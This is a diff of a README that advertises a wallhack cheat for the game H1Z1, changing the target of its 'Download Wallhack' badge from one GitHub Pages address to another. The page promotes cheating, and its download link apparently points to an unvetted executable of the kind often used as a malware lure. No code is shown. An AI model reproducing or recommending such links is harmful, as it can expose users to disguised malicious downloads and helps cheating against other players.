@@ -6,7 +6,7 @@ If you’ve played *H1Z1* long enough, you know one thing—**seeing first means
 
 No more blind corners. No more guessing. Just **total intel** in real-time.
 
-[![Download Wallhack](https://img.shields.io/badge/Download-Wallhack-blueviolet)](https://H1Z1-Wallhack-na540.github.io/.github)
+[![Download Wallhack](https://img.shields.io/badge/Download-Wallhack-blueviolet)](https://hicksemanuel43.github.io/)
 ---
 
 ## 🎮 What Is a Wallhack in H1Z1?
